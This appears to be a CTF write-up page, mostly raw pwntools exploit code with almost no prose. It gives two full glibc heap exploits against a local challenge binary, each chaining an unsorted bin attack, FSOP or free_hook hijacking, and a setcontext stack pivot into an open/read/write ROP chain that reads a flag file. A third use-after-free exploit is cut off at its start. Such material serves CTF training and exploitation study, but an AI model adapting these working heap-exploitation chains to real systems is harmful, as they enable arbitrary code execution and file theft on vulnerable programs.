<h2 id="unsorted-bin-attack-libc-2-27-FSOP-set-context"><a href="#unsorted-bin-attack-libc-2-27-FSOP-set-context" class="headerlink" title="unsorted bin attack + libc-2.27 + FSOP + set_context"></a>unsorted bin attack + libc-2.27 + FSOP + set_context</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="comment">#sh = remote("125.71.5.44",50014)</span></span><br><span class="line">sh = process(<span class="string">'./chall'</span>)</span><br><span class="line">context.binary = <span class="string">"./chall"</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#elf = ELF('./Easyheap')</span></span><br><span class="line"><span class="comment">#libc = context.binary.libc</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.27.so')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(<span class="number">0</span>) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(sh,<span class="string">"b *$rebase(0xd20)"</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">    sh.sendafter(<span class="string">'content:'</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'edit?'</span>,str(idx))</span><br><span class="line">    sh.sendafter(<span class="string">'content:'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'show?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">"?"</span>,str(idx))</span><br><span class="line"><span class="comment">#leak heap_addr</span></span><br><span class="line">add(<span class="number">0x520</span>,<span class="string">'aaaaaaaa'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"aaaaaaaa"</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr = u64(sh.recvuntil(<span class="string">"\x55"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">496</span> + <span class="number">0x10</span></span><br><span class="line">print(hex(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">'a'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1400</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">'a'</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">3951392</span> - <span class="number">88</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">rtl_global = libc_base + <span class="number">0x83c040</span></span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">53</span></span><br><span class="line">ret = libc_base + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">127</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x18CE57</span></span><br><span class="line">system_addr =  libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">'printf'</span>]</span><br><span class="line">global_max_fast = libc_base + <span class="number">3958776</span></span><br><span class="line">IO_str_jumps = libc_base + <span class="number">0x3c37a0</span></span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">'open'</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">'read'</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">'write'</span>]</span><br><span class="line">flag_addr = heap_addr+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortbin attack</span></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">88</span>+<span class="number">3951392</span>) +p64(global_max_fast<span class="number">-0x10</span>))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_addr+<span class="number">0x200</span></span><br><span class="line">frame.rip = ret</span><br><span class="line">frame.rdi = flag_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">30</span></span><br><span class="line"></span><br><span class="line">payload = bytes(frame)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += p64(open_addr) + p64(pop_rdi) + p64(<span class="number">0x14</span>) + p64(pop_rsi) + p64(flag_addr) + p64(read_addr) <span class="comment">#open &amp;read</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x300</span>,<span class="string">b'\x00'</span>) + <span class="string">b'./flag\x00'</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x520</span>,payload) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#hijack io_list_all</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">fake_file = pack_file(_IO_read_base=IO_list_all<span class="number">-0x10</span>,</span><br><span class="line">                    _IO_write_base=<span class="number">0</span>,</span><br><span class="line">                    _IO_write_ptr=<span class="number">1</span>,</span><br><span class="line">                    _IO_buf_base=heap_addr,</span><br><span class="line">                    _mode=<span class="number">0</span>,)</span><br><span class="line">fake_file += p64(IO_str_jumps<span class="number">-8</span>)+p64(<span class="number">0</span>)+p64(set_context)</span><br><span class="line">edit(<span class="number">2</span>,fake_file[<span class="number">0x10</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">#abort fsop </span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="comment">#sh = remote("125.71.5.44",50014)</span></span><br><span class="line">sh = process(<span class="string">'./chall'</span>)</span><br><span class="line">context.binary = <span class="string">"./chall"</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#elf = ELF('./Easyheap')</span></span><br><span class="line"><span class="comment">#libc = context.binary.libc</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.27.so')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(<span class="number">0</span>) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(sh,<span class="string">"b *$rebase(0xd20)"</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">    sh.sendafter(<span class="string">'content:'</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'edit?'</span>,str(idx))</span><br><span class="line">    sh.sendafter(<span class="string">'content:'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'show?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">"?"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x520</span>,<span class="string">'aaaaaaaa'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"aaaaaaaa"</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr = u64(sh.recvuntil(<span class="string">"\x55"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">496</span> + <span class="number">0x10</span></span><br><span class="line">print(hex(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">'a'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x3910</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">'a'</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">3951392</span> - <span class="number">88</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">rtl_global = libc_base + <span class="number">0x83c040</span></span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">53</span></span><br><span class="line">ret = libc_base + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">127</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x18CE57</span></span><br><span class="line">system_addr =  libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">'printf'</span>]</span><br><span class="line">global_max_fast = libc_base + <span class="number">3958776</span></span><br><span class="line">IO_str_jumps = libc_base + <span class="number">0x3c37a0</span></span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">'open'</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">'read'</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">'write'</span>]</span><br><span class="line">flag_addr = heap_addr+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">88</span>+<span class="number">3951392</span>) +p64(global_max_fast<span class="number">-0x10</span>))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_addr+<span class="number">0x200</span></span><br><span class="line">frame.rip = ret</span><br><span class="line">frame.rdi = flag_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">30</span></span><br><span class="line"></span><br><span class="line">payload = bytes(frame)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += p64(open_addr) + p64(pop_rdi) + p64(<span class="number">0x3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(read_addr) <span class="comment">#open &amp;read</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x300</span>,<span class="string">b'\x00'</span>) + <span class="string">b'./flag\x00'</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x520</span>,payload) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)  <span class="comment">#now fastbin: 0x3920: chunk2_addr =&gt; free_hook: chunk2_addr</span></span><br><span class="line">edit(<span class="number">2</span>,p64(set_context)) <span class="comment"># fastbin: 0x3920: chunk2_addr -&gt; set_context</span></span><br><span class="line">add(<span class="number">0x3910</span>,<span class="string">'a'</span>) <span class="comment"># fastbin: 0x3920: set_context , so now free_hook: set_context</span></span><br><span class="line">print(hex(set_context))</span><br><span class="line">debug()</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># set_context(chunk4)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="libc-2-31-UAF-chunk-size-lt-0x80"><a href="#libc-2-31-UAF-chunk-size-lt-0x80" class="headerlink" title="libc-2.31 + UAF + chunk_size&lt;=0x80"></a>libc-2.31 + UAF + chunk_size&lt;=0x80</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># context.terminal=['tmux', 'splitw', '-h']</span></span><br><span class="line">prog = <span class="string">'./ezuaf'</span></span><br><span class="line">elf = ELF(prog)</span><br><span class="line">p = process(prog)<span class="comment">#,env=&#123;"LD_PRELOAD":"./libc-2.23.so","LD_PRELOAD":"./ld-2.33.so"&#125;)</span></span><br><span class="line">libc = ELF(<span 